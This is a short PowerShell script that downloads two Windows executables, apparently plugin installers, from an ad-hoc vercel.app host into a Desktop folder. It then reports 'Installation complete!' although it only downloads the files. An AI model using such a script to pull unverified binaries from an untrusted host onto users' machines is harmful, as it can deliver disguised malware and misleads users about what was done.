$ErrorActionPreference = "Stop"

$folder = "$env:USERPROFILE\Desktop\MyPlugin"

New-Item -ItemType Directory -Path $folder -Force | Out-Null

$files = @(
    "https://my-installer-73cn.vercel.app/st-setup-1.8.30.exe",
    "https://my-installer-73cn.vercel.app/MillenniumInstaller-Windows.exe"
)

foreach ($url in $files) {

    $name = Split-Path $url -Leaf
    $destination = Join-Path $folder $name

    Write-Host "Downloading $name..."

    Invoke-WebRequest `
        -Uri $url `
        -OutFile $destination

    if (Test-Path $destination) {
        Write-Host "$name OK" -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "Installation complete!" -ForegroundColor Green
